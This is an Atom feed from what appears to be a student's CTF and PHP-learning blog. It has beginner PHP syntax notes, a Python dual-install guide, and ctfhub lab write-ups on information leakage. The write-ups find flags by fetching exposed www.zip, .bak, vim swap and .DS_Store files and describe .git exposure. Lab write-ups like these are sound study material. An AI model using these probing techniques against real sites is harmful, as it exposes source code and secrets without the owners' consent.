<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lingxin16&#39;blog</title>
  
  <subtitle>ctf</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lingxin16.github.io/"/>
  <updated>2020-03-15T14:59:58.060Z</updated>
  <id>http://lingxin16.github.io/</id>
  
  <author>
    <name>奝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>php学习day4</title>
    <link href="http://lingxin16.github.io/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/"/>
    <id>http://lingxin16.github.io/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/</id>
    <published>2020-03-15T13:52:40.000Z</published>
    <updated>2020-03-15T14:59:58.060Z</updated>
    
    <content type="html"><![CDATA[<h2 id="计算机码"><a href="#计算机码" class="headerlink" title="计算机码"></a>计算机码</h2><a id="more"></a><p>计算机码：计算机在实际存储数据的时候，采用的编码规则（二进制规则）</p><p>计算机码：原码、反码和补码，数值本身最左边一位是符号位，正数为0，负数为1</p><p>原码：数据本身从十进制转换成二进制得到的结果</p><p>​        正数：左边符号位为0  (正数的原码、反码和补码就是原码本身)</p><p>​        负数：左边符号位为1</p><p>反码：针对负数，符号位不变，其他位取反(01转换)</p><p>补码：针对负数，反码+1</p><p>系统中存在两个0：+0和-0</p><p>+0:00000000</p><p>-0:10000000    原码</p><p>取反：11111111</p><p>补码：00000000</p><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">位运算:取出计算机中最小的单位(位bit)进行运算</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&amp;：按位与，两个位都为1，结果为1，否则为0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">|：按位或，两个有一-个为1，结果为1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">~：按位非，一个位如果为1则变成0，否则反之</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">^：按位异或，两个相同则为0,不同则为1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&lt;&lt;：按位左移，整个位(32位), 向左移动一位，右边补0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&gt;&gt;：按位右移，整个位向右移动一位，左边补符号位对应内容(正数补0，负数补1)</span></pre></td></tr></table></figure><p>计算机进行任何位运算时使用的是补码</p><p>运算结束之后都必须转换成原码才是最终要显示的数据</p><p>按位左移：乘以2的操作</p><p>按位右移：除以2的操作</p><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p>运算符优先级:在多种运算符同时存在的时候，如何结合运算</p><p><img src="/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/QQ%E6%88%AA%E5%9B%BE20200315225044.jpg" alt="QQ截图20200315225044"></p><p><img src="/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/QQ%E6%88%AA%E5%9B%BE20200315225106.jpg" alt="QQ截图20200315225106"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;计算机码&quot;&gt;&lt;a href=&quot;#计算机码&quot; class=&quot;headerlink&quot; title=&quot;计算机码&quot;&gt;&lt;/a&gt;计算机码&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://lingxin16.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Python安装双版本</title>
    <link href="http://lingxin16.github.io/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/"/>
    <id>http://lingxin16.github.io/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/</id>
    <published>2020-03-15T09:37:56.000Z</published>
    <updated>2020-03-15T09:46:12.718Z</updated>
    
    <content type="html"><![CDATA[<p>Python的环境部署一直是有问题，今天就想个办法把这个问题解决了</p><p>同时安装Python2和Python3的版本并配置环境变量</p><a id="more"></a><p>在官网下载Python2和Python3的安装包</p><p>安装Python2和Python3的时候都勾选add to path(配置环境变量)</p><p>然后在Python2文件夹里把python.exe改为python2.exe</p><p>同理在scripts文件夹下把pip.exe分别改为pip2.exe</p><p>这个时候测试的话pip2 -V命令会报错</p><p>我们在官网下载pip安装包，cmd中cd命令进入安装文件</p><p>然后python2 setup.py install</p><p><img src="/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/1.png" alt="1"></p><p>ok！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python的环境部署一直是有问题，今天就想个办法把这个问题解决了&lt;/p&gt;
&lt;p&gt;同时安装Python2和Python3的版本并配置环境变量&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="环境部署" scheme="http://lingxin16.github.io/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>php学习day3</title>
    <link href="http://lingxin16.github.io/2020/03/14/php%E5%AD%A6%E4%B9%A0day3/"/>
    <id>http://lingxin16.github.io/2020/03/14/php%E5%AD%A6%E4%B9%A0day3/</id>
    <published>2020-03-14T14:13:25.000Z</published>
    <updated>2020-03-14T16:19:59.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h2><a id="more"></a><p>浮点型：小数类型以及超过整型所能存储范围的整数</p><p>浮点型定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$f&#x3D;1.23;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$f&#x3D;1.23e10;      &#x2F;&#x2F;科学计数法，其中e表示低10   1.23×10^10</span></pre></td></tr></table></figure><p>浮点数不够精确</p><h2 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h2><p>两个值：true和false  通常用于判断</p><p>在进行某些数据判断的时候，需要特别注意类型转换</p><p>Empty()：判断数据的值是否为“空”，而不是NULL，如果为空返回true，不为空返回false</p><p>lsset()：判断数据存储的变量本身是否存在，存在变量返回true，不存在返回false</p><p><img src="/2020/03/14/php%E5%AD%A6%E4%B9%A0day3/QQ%E6%88%AA%E5%9B%BE20200314222620.jpg" alt="QQ截图20200314222620"></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>运算符：operator，是一种将数据进行运算的特殊符号，在php中一共有十种运算符之多</p><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>赋值运算：符号是“=”，表示将右边的结果(可以是变量、数据、常量和其他运算出来的结果)，保存到内存的某个位置，然后将位置的内存地址赋值给左侧的变量(常量)</p><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>+：执行数据累加<br>-：数据相减<br>*：两个数相乘<br>/：两个数相除<br>%：取余运算，两个数(整数)相除保留余数</p><p>在进行除法运算或取余运算时后边的数不能为零</p><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>比较运算：比较两个数据的大小，或者两个内容是否相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&gt;：左边大于右边，返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&gt;&#x3D;：左边大于等于右边，返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&lt;：左边小于右边，返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&lt;&#x3D;：左边小于等于右边，返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;：左边与右边的相同（大小相同），返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">!&#x3D;：左边与右边的不同（大小不相同），返回true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;：全等于 左边与右边的相同（大小以及数据的类型都要相同）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">!&#x3D;&#x3D;：不全等于 左边与右边的不相同（大小或数据的类型不同）</span></pre></td></tr></table></figure><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">逻辑运算：针对不同的结果进行匹配</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&amp;&amp;：逻辑与  左边的条件与右边的条件同时成立（两边结果都为true）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">||：逻辑或 左边的条件嚯右边的条件只要有一个满足即可</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">！：逻辑非 对已有条件进行取反</span></pre></td></tr></table></figure><p>逻辑与和逻辑或又称为短路运算：如果第-一个表达式结果已经满足条件了，那么就不会运行逻辑运算符后面的表达式  在书写代码的时候，尽量将出现概率最高的(能够直接判断出结果)的表达式放到第一位</p><h3 id="连接运算符"><a href="#连接运算符" class="headerlink" title="连接运算符"></a>连接运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">连接运算:是PHP中将多个字符串拼接的一种符号</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">.：将两个字符串连接到一起</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">.&#x3D;：复合运算，将左边的内容与右边的内容连接起来，然后重新赋值给左边变量</span></pre></td></tr></table></figure><h3 id="错误抑制符"><a href="#错误抑制符" class="headerlink" title="错误抑制符"></a>错误抑制符</h3><p>在PHP中有一些错误可以提前预知，但是这些错误可能无法避免，但是又不希望报错给用户看，可以使用错误抑制符处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">@：在可能出错的表达式前面使用@符号即可</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">@(可能出错的代码);</span></pre></td></tr></table></figure><h3 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h3><p>三目运算:有三个表达式参与的运算(简单的的分支结构缩写)。</p><p>语法格式:</p><p>表达式1 ? 表达式2 :  表达式3;（如果表达式1成立，那么执行表达式2，否则执行表达式3）</p><h3 id="自操作运算符"><a href="#自操作运算符" class="headerlink" title="自操作运算符"></a>自操作运算符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">++</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">--</span></pre></td></tr></table></figure><p>后置自操作运算符$a++</p><p>前置自操作运算符++$a</p><p>b=$a++   先赋值再运算</p><p>b=++$a   先运算再赋值</p><p>衍生符号：类似自操作</p><p>+=：左边的结果与右边的结果相加，然后赋值给左边<br>-=：左边的减去右边的结果，然后赋值给左边<br>*=：乘法操作<br>/=：除法操作<br>%=：模操作</p><p>注意：右边是一个整体！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;浮点类型&quot;&gt;&lt;a href=&quot;#浮点类型&quot; class=&quot;headerlink&quot; title=&quot;浮点类型&quot;&gt;&lt;/a&gt;浮点类型&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://lingxin16.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>ctfhub-信息泄露-Git泄露</title>
    <link href="http://lingxin16.github.io/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/"/>
    <id>http://lingxin16.github.io/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/</id>
    <published>2020-03-14T07:32:37.000Z</published>
    <updated>2020-03-14T08:14:35.572Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><p>启动环境</p><p><img src="/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/QQ%E6%88%AA%E5%9B%BE20200314153525.jpg" alt="QQ截图20200314153525"></p><p>相关说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Log&quot;&gt;&lt;a href=&quot;#Log&quot; class=&quot;headerlink&quot; title=&quot;Log&quot;&gt;&lt;/a&gt;Log&lt;/h2&gt;&lt;p&gt;启动环境&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/14/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%
      
    
    </summary>
    
    
    
      <category term="ctfhub" scheme="http://lingxin16.github.io/tags/ctfhub/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
      <category term="信息泄露" scheme="http://lingxin16.github.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
      <category term="Git泄露" scheme="http://lingxin16.github.io/tags/Git%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>php学习day2</title>
    <link href="http://lingxin16.github.io/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/"/>
    <id>http://lingxin16.github.io/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/</id>
    <published>2020-03-13T13:34:25.000Z</published>
    <updated>2020-03-13T14:22:39.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数据类型判断"><a href="#数据类型判断" class="headerlink" title="数据类型判断"></a>数据类型判断</h2><a id="more"></a><p>通过一组类型判断函数，来判断变量，最终返回这个变量所保存数据的数据类型(相同为true,否则为false)：是一组以is_开头后面跟类型名字的函数</p><p>is_×××(变量名)</p><p>Bool(布尔)类型不能用echo来查看，可以使用var_dump来查看</p><p>Var_dump(变量1,变量2…)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Var_dump(is_int($a));</span></pre></td></tr></table></figure><p>Gettype(变量名)：获取类型 得到的是该类型对应的字符串</p><p>Settype(变量名,类型)：设定数据类型，与强制转换不同</p><p>1.强制转换(类型)变量名，是对数据复制的内容进行处理（不会处理实际存储的内容）</p><p>2.Settype会直接改变数据本身</p><h2 id="整数类型进制"><a href="#整数类型进制" class="headerlink" title="整数类型进制"></a>整数类型进制</h2><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><p>在PHP中提供了四种整型的定义方式：十进制定义、二进制定义、八进制定义、十六进制定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;120;        &#x2F;&#x2F;10进制</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;0b110;      &#x2F;&#x2F;2进制</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;0120;       &#x2F;&#x2F;8进制</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;0×120;      &#x2F;&#x2F;16进制</span></pre></td></tr></table></figure><p>默认的PHP输出数值都会自动转换成10进制</p><h3 id="整数类型进制转换"><a href="#整数类型进制转换" class="headerlink" title="整数类型进制转换"></a>整数类型进制转换</h3><p><img src="/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/QQ%E6%88%AA%E5%9B%BE20200313221130.jpg" alt="QQ截图20200313221130"></p><p><img src="/2020/03/13/php%E5%AD%A6%E4%B9%A0day2/QQ%E6%88%AA%E5%9B%BE20200313221726.jpg" alt="QQ截图20200313221726"></p><p>Decbin():     十进制转二进制</p><p>Decoct():     十进制转八进制</p><p>Dechex():     十进制转十六进制</p><p>Bindec():      二进制转十进制</p><p>……以此类推</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">var_dump(decbin(107));</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;数据类型判断&quot;&gt;&lt;a href=&quot;#数据类型判断&quot; class=&quot;headerlink&quot; title=&quot;数据类型判断&quot;&gt;&lt;/a&gt;数据类型判断&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://lingxin16.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>php学习day1</title>
    <link href="http://lingxin16.github.io/2020/03/12/php%E5%AD%A6%E4%B9%A0day1/"/>
    <id>http://lingxin16.github.io/2020/03/12/php%E5%AD%A6%E4%B9%A0day1/</id>
    <published>2020-03-12T07:15:35.000Z</published>
    <updated>2020-03-12T11:32:51.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><a id="more"></a><h3 id="常量定义："><a href="#常量定义：" class="headerlink" title="常量定义："></a>常量定义：</h3><p>常量在定义时必须赋值</p><p>define(‘常量名’,常量值)；</p><p>const 常量名 = 常量值;//(php5.3之后)</p><p>常量名命名规则:</p><p>1.常量的名字组成由字母、数字和下划线组成，不能以数字开头</p><p>2.常量的名字通常是以大写字母为主(为了与变量区别)</p><p>3.常量的名字可以使用一些特殊符号(如-_-(只能使用define))</p><p>特殊名字的常量在访问时需要用echo constant(‘常量名’);</p><h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><p>系统常量:系统定义，用户可以直接调用。</p><p>常见系统常量:</p><p>PHP_VERSION：PHP版本号</p><p>PHP_INT_SIZE：整形大小</p><p>PHP_INT_MAX：整形能表示的最大值</p><h3 id="特殊常量"><a href="#特殊常量" class="headerlink" title="特殊常量"></a>特殊常量</h3><p>由双下划线开始+常量名+双下划线结束(系统魔术常量)</p><p>会随着环境变化，但无法改变</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">__DIR__：当前被执行的脚本所在电脑的绝对路径</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">__FILE__：当前被执行的脚本所在电脑的绝对路径（带自己的文件名）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">__LINE__：当前所属的行数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">__NAMESPACE__：当前所属的命名空间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">__CLASS__：当前所属的类</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">__METHOD__：当前所属的方法</span></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型：data type，在PHP中指的是存储的数据本身的类型，而不是变量的类型。PHP是一种弱类型语言，变量本身没有数据类型。</p><h3 id="PHP的八种数据类型："><a href="#PHP的八种数据类型：" class="headerlink" title="PHP的八种数据类型："></a>PHP的八种数据类型：</h3><p>在PHP中将数据分为三大类八小类</p><h4 id="简单-基本-数据类型：4小类"><a href="#简单-基本-数据类型：4小类" class="headerlink" title="简单(基本)数据类型：4小类"></a>简单(基本)数据类型：4小类</h4><p>整型：int/integer，系统分配4个字节存储，表示整数类型</p><p>浮点型：float/double，系统分配8个字节存储，表示小数或者整型存不下的整数</p><p>字符串型：string，系统根据实际长度分配，表示字符串(引号)</p><p>布尔类型：bool/boolean，表示布尔类型，只有两个值：true和false</p><h4 id="复合数据类型：2小类"><a href="#复合数据类型：2小类" class="headerlink" title="复合数据类型：2小类"></a>复合数据类型：2小类</h4><p>对象类型：object，存放对象(面向对象)</p><p>数组类型：array，存储多个数据(一次性)</p><h4 id="特殊数据类型：2小类"><a href="#特殊数据类型：2小类" class="headerlink" title="特殊数据类型：2小类"></a>特殊数据类型：2小类</h4><p>资源类型：resource，存放资源数据(PHP外部数据，如数据库、文件)</p><p>空类型：NULL，只有一个值就是NULL(不能运算)</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>1.自动转换：系统根据需求自己判断、自己转换</p><p>2.强制(手动)转换：认为根据需要的目标类型转换</p><p>在转换过程中用的比较多的就是转布尔类型(判断)和转数值类型(算数运算)</p><p><img src="/2020/03/12/php%E5%AD%A6%E4%B9%A0day1/QQ%E6%88%AA%E5%9B%BE20200312160116.jpg" alt="QQ截图20200312160116"></p><p>1.布尔true为1，false为0</p><p>2.字符串转数值有自己的规则</p><p>2.1以字母开头的字符串永远为0</p><p>2.2以数字开头的字符串，取到碰到字符串为止(不会同时包含两个小数点)</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;常量&quot;&gt;&lt;a href=&quot;#常量&quot; class=&quot;headerlink&quot; title=&quot;常量&quot;&gt;&lt;/a&gt;常量&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="php" scheme="http://lingxin16.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>ctfhub-信息泄泄露_备份文件下载</title>
    <link href="http://lingxin16.github.io/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
    <id>http://lingxin16.github.io/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</id>
    <published>2020-03-10T08:47:23.000Z</published>
    <updated>2020-03-10T09:14:44.383Z</updated>
    
    <content type="html"><![CDATA[<p>题目</p><h2 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h2><a id="more"></a><p>给的一些提示</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/1.png" alt="1"></p><p>在<a href="http://www.zip中找到备份文件下载" target="_blank" rel="noopener">www.zip中找到备份文件下载</a></p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310164900.jpg" alt="QQ截图20200310164900"></p><p>由于在三个文件中都没有找到flag 最后访问网站的三个目录，在/flag_716325087.txt中找到flag</p><h2 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h2><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310165506.jpg" alt="QQ截图20200310165506"></p><p>打开index.php.bak下载备份文件</p><p>记事本打开得到flag</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310165638.jpg" alt="QQ截图20200310165638"></p><h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><p>查看页面</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310165827.jpg" alt="QQ截图20200310165827"></p><p>关于vim缓存：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">以 index.php 为例：第一次产生的交换文件名为 .index.php.swp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">再次意外退出后，将会产生名为 .index.php.swo 的交换文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">第三次产生的交换文件则为 .index.php.swn</span></pre></td></tr></table></figure><p>访问.index.php.swp下载文件</p><p>打开拖到最后 得到flag</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310170243.jpg" alt="QQ截图20200310170243"></p><h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>题目</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310170706.jpg" alt="QQ截图20200310170706"></p><p>访问.DS_Store下载</p><p>打开发现一个txt文件(也可以使用Python-dsstore工具处理)附上下载地址：<a href="https://github.com/gehaxelt/Python-dsstore" target="_blank" rel="noopener">https://github.com/gehaxelt/Python-dsstore</a></p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310170901.jpg" alt="QQ截图20200310170901"></p><p>访问这个地址(去掉空格)得到flag</p><p><img src="/2020/03/10/ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/QQ%E6%88%AA%E5%9B%BE20200310171109.jpg" alt="QQ截图20200310171109"></p><p>关于.DS_Store</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目&lt;/p&gt;
&lt;h2 id=&quot;网站源码&quot;&gt;&lt;a href=&quot;#网站源码&quot; class=&quot;headerlink&quot; title=&quot;网站源码&quot;&gt;&lt;/a&gt;网站源码&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="ctfhub" scheme="http://lingxin16.github.io/tags/ctfhub/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
      <category term="信息泄露" scheme="http://lingxin16.github.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-php_rce</title>
    <link href="http://lingxin16.github.io/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/"/>
    <id>http://lingxin16.github.io/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/</id>
    <published>2020-03-09T08:05:13.000Z</published>
    <updated>2020-03-09T08:31:11.074Z</updated>
    
